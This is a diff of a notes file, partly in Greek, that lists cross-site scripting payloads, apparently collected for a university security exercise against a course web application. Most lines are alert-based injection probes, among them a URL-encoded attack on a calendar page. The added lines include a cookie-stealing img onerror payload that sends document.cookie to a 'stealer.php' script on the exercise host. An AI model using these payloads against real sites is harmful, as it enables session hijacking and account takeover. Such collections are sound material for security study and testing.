@@ -1,6 +1,8 @@
 ------------------------------------------------------------
 Αλλαγή ονόματος
 --><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+
+
 --><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
 </br style=a:expression(alert())>
 <body onLoad="alert('XSS');"
@@ -118,8 +120,11 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 		---> Επώνυμο/Όνομα/Όνομα χρήστη
 			'">><marquee><h1>XSS</h1></marquee>
 	
-	
-http://the-intruders.csec.chatzi.org/modules/agenda/myagenda.php?month=10&year=2030%27--%3E%3C!--%20---%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E	
+----	
+http://the-intruders.csec.chatzi.org/modules/agenda/myagenda.php?month=10&year=2030%27--%3E%3C!--%20---%3E%20%3Cimg%20src=xxx:x%20onerror=javascript:alert(1)%3E%20--%3E
+
+COOKIE
+<img src="" onerror="document.location='http://the-intruders.csec.chatzi.org/stealer.php?cookie=' 	+document.cookie;"/>
 --------------------------------------------------------------------------------------------------------
 
 THANOS:
